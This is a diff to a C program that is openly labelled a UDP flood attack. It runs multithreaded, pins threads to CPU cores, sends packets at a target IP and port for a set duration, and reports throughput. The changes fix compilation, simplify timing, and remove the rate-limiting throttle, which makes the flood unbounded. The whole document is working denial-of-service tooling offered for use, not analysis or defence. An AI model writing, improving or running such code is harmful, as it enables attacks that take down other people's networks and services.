@@ -1,3 +1,5 @@
+#define _GNU_SOURCE  // MUST be at the very top before any includes
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,7 +12,7 @@
 #include <errno.h>
 #include <sched.h>
 #include <sys/mman.h>
-#include <netinet/tcp.h>  // Added for TCP_NODELAY
+#include <netinet/tcp.h>
 
 #define MAX_THREADS 64
 #define PACKET_SIZE 1472
@@ -42,14 +44,13 @@ void init_packets() {
 void* flood_thread(void* arg) {
     thread_data_t* data = (thread_data_t*)arg;
     
-    // Set CPU affinity
+    // Set CPU affinity (only if available)
+    #ifdef _GNU_SOURCE
     pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &data->cpu_set);
+    #endif
     
     unsigned long long packets_sent = 0;
     int packet_index = 0;
-    struct timespec start_ts, current_ts;
-    
-    clock_gettime(CLOCK_MONOTONIC, &start_ts);
     
     while (*(data->running)) {
         for (int burst = 0; burst < 32; burst++) {
@@ -58,17 +59,6 @@ void* flood_thread(void* arg) {
             
             packets_sent++;
             packet_index = (packet_index + 1) % 16;
-        }
-        
-        if ((packets_sent & 0x3FF) == 0) {
-            clock_gettime(CLOCK_MONOTONIC, &current_ts);
-            long elapsed_ns = (current_ts.tv_sec - start_ts.tv_sec) * 1000000000L + 
-                             (current_ts.tv_nsec - start_ts.tv_nsec);
-            
-            long expected_packets = (elapsed_ns * TARGET_PPS) / 1000000000L;
-            if (packets_sent > expected_packets + 10000) {
-                usleep(100);
-            }
         }
     }
     
@@ -92,16 +82,12 @@ int main(int argc, char *argv[]) {
         exit(1);
     }
 
-    printf("Starting 10 Gbps UDP Flood Attack:\n");
+    printf("Starting UDP Flood Attack:\n");
     printf("Target: %s:%d\n", target_ip, target_port);
     printf("Threads: %d\n", thread_count);
-    printf("Target Rate: %d Mbps (~%d packets/sec)\n", TARGET_MBPS, TARGET_PPS);
+    printf("Target Rate: %d Mbps\n", TARGET_MBPS);
     printf("Packet Size: %d bytes\n", PACKET_SIZE);
     printf("Duration: %d seconds\n\n", ATTACK_DURATION);
-
-    if (mlockall(MCL_CURRENT | MCL_FUTURE) == -1) {
-        perror("Warning: Could not lock memory");
-    }
 
     srand(time(NULL));
     init_packets();
@@ -117,9 +103,6 @@ int main(int argc, char *argv[]) {
     
     int sendbuf_size = 10 * 1024 * 1024;
     setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf_size, sizeof(sendbuf_size));
-    
-    // TCP_NODELAY is for TCP sockets, but we'll keep it for completeness
-    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
 
     struct sockaddr_in target_addr;
     memset(&target_addr, 0, sizeof(target_addr));
@@ -134,7 +117,7 @@ int main(int argc, char *argv[]) {
     pthread_t threads[MAX_THREADS];
     thread_data_t thread_data[MAX_THREADS];
     volatile int running = 1;
-    clock_t start_time = clock();
+    time_t start_time = time(NULL);
 
     printf("Initializing %d flood threads...\n", thread_count);
     
@@ -145,8 +128,10 @@ int main(int argc, char *argv[]) {
         thread_data[i].running = &running;
         thread_data[i].packets_sent = 0;
         
+        #ifdef _GNU_SOURCE
         CPU_ZERO(&thread_data[i].cpu_set);
         CPU_SET(i % sysconf(_SC_NPROCESSORS_ONLN), &thread_data[i].cpu_set);
+        #endif
         
         if (pthread_create(&threads[i], NULL, flood_thread, &thread_data[i]) != 0) {
             perror("Thread creation failed");
@@ -158,29 +143,24 @@ int main(int argc, char *argv[]) {
     printf("Attack running for %d seconds...\n", ATTACK_DURATION);
     
     unsigned long long total_prev = 0;
-    struct timespec monitor_start, monitor_now;
-    clock_gettime(CLOCK_MONOTONIC, &monitor_start);
+    time_t last_print = time(NULL);
     
-    while ((clock() - start_time) / CLOCKS_PER_SEC < ATTACK_DURATION) {
+    while (time(NULL) - start_time < ATTACK_DURATION) {
         sleep(1);
-        
-        clock_gettime(CLOCK_MONOTONIC, &monitor_now);
-        long elapsed_ms = (monitor_now.tv_sec - monitor_start.tv_sec) * 1000 + 
-                         (monitor_now.tv_nsec - monitor_start.tv_nsec) / 1000000;
         
         unsigned long long total_current = 0;
         for (int i = 0; i < thread_count; i++) {
             total_current += thread_data[i].packets_sent;
         }
         
-        double interval_pps = (double)(total_current - total_prev) * 1000.0 / elapsed_ms;
+        double interval_pps = (double)(total_current - total_prev);
         double interval_mbps = (interval_pps * PACKET_SIZE * 8) / (1024.0 * 1024.0);
         
         printf("Current: %.2f Mbps (%.0f pps) | Total: %llu packets\n", 
                interval_mbps, interval_pps, total_current);
         
         total_prev = total_current;
-        monitor_start = monitor_now;
+        last_print = time(NULL);
     }
 
     running = 0;
@@ -198,13 +178,11 @@ int main(int argc, char *argv[]) {
     double total_mbps = (total_packets * PACKET_SIZE * 8) / 
                        (ATTACK_DURATION * 1024.0 * 1024.0);
     double avg_pps = total_packets / (double)ATTACK_DURATION;
-    double efficiency = (total_mbps / TARGET_MBPS) * 100;
 
     printf("\nAttack Completed!\n");
     printf("Total packets sent: %llu\n", total_packets);
     printf("Average throughput: %.2f Mbps\n", total_mbps);
     printf("Average packets/sec: %.0f\n", avg_pps);
-    printf("Target achieved: %.1f%%\n", efficiency);
 
     close(sock);
     return 0;
